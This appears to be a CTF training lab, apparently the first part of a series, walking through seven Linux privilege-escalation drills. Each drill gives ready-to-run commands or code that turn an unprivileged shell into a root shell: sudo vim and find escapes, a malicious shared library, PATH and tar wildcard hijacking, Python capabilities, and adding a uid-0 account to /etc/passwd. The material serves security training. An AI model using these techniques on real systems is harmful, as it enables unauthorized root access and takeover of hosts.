# Lab 07 (Part 1): 10 Hands-On Linux Privilege Escalation Drills

Practice scenarios replicating real CTF challenges (TryHackMe, Hack The Box, OSCP) for escalating from an unprivileged shell to `root`.

---

## 🥊 Scenario 1: Sudo GTFOBins (Vim)
- **Vulnerability**: Administrator misconfigured `/etc/sudoers` allowing your user to run `vim` as root without a password:
  ```text
  $ sudo -l
  (ALL) NOPASSWD: /usr/bin/vim
  ```
- **Exploitation**:
  Vim allows executing shell commands from its internal command bar:
  ```bash
  sudo vim -c ':!/bin/sh'
  ```
- **Result**: Immediate root shell (`# whoami -> root`).

---

## 🥊 Scenario 2: Sudo GTFOBins (Find)
- **Vulnerability**:
  ```text
  $ sudo -l
  (ALL) NOPASSWD: /usr/bin/find
  ```
- **Exploitation**:
  The `find` utility has an `-exec` flag that executes commands with the privileges of the running process:
  ```bash
  sudo find . -exec /bin/sh \; -quit
  ```

---

## 🥊 Scenario 3: SUID Binary with Shared Library Hijacking
- **Vulnerability**: You find a custom SUID binary owned by root:
  ```bash
  find / -perm -u=s -type f 2>/dev/null
  # Output: /opt/backup/custom_archiver
  ```
- **Reconnaissance**:
  Run `strace` or `ltrace` on the binary:
  ```bash
  strace /opt/backup/custom_archiver 2>&1 | grep -i 'open'
  # Output: openat(AT_FDCWD, "/tmp/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
  ```
  The binary attempts to load a library from writable `/tmp`!
- **Exploitation**:
  Create malicious `/tmp/libcalc.c`:
  ```c
  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>
  void calc() {
      setuid(0);
      setgid(0);
      system("/bin/bash -p");
  }
  ```
  Compile and run:
  ```bash
  gcc -shared -fPIC -o /tmp/libcalc.so /tmp/libcalc.c
  /opt/backup/custom_archiver
  ```

---

## 🥊 Scenario 4: PATH Variable Hijacking in SUID
- **Vulnerability**: A SUID binary executes a standard system binary without specifying its full path:
  ```bash
  strings /usr/local/bin/status_check
  # Output contains: "service apache2 status"  (Notice no /usr/sbin/service!)
  ```
- **Exploitation**:
  Prepend `/tmp` to your `$PATH` and create a fake `service` executable:
  ```bash
  echo '/bin/bash -p' > /tmp/service
  chmod +x /tmp/service
  export PATH=/tmp:$PATH
  /usr/local/bin/status_check
  ```
  The binary looks in `/tmp` first, executes your script, and spawns a root shell!

---

## 🥊 Scenario 5: Linux Capabilities (`cap_setuid`)
- **Vulnerability**: An administrator or package granted capabilities to python:
  ```bash
  getcap -r / 2>/dev/null
  # Output: /usr/bin/python3.10 = cap_setuid+ep
  ```
- **Exploitation**:
  Set process UID to 0 directly:
  ```bash
  /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  ```

---

## 🥊 Scenario 6: Writable `/etc/passwd`
- **Vulnerability**: Misconfigured file permissions on `/etc/passwd`:
  ```bash
  ls -l /etc/passwd
  # -rw-rw-rw- 1 root root ... /etc/passwd  (World writable!)
  ```
- **Exploitation**:
  Generate an encrypted password hash for password `password123`:
  ```bash
  openssl passwd -1 -salt hacker password123
  # Output: $1$hacker$pY0x8W...
  ```
  Append a new root-level user to `/etc/passwd`:
  ```bash
  echo 'toor:$1$hacker$pY0x8W...:0:0:root:/root:/bin/bash' >> /etc/passwd
  su toor
  # Password: password123 -> Root shell!
  ```

---

## 🥊 Scenario 7: Cron Job Wildcard Injection (Tar Checkpoint)
- **Vulnerability**: Root crontab runs a backup job every minute:
  ```text
  * * * * * root cd /var/www/html && tar -zcf /backups/site.tar.gz *
  ```
- **Exploitation**:
  The wildcard `*` expands to all filenames in the directory as command arguments!
  Create files named after `tar` command-line flags:
  ```bash
  cd /var/www/html
  echo 'chmod +s /bin/bash' > root_shell.sh
  chmod +x root_shell.sh
  touch -- '--checkpoint=1'
  touch -- '--checkpoint-action=exec=sh root_shell.sh'
  ```
  Within 60 seconds, cron triggers tar, parses the filenames as arguments, executes `root_shell.sh`, and sets SUID on `/bin/bash`!
  Run: `/bin/bash -p` to claim root.
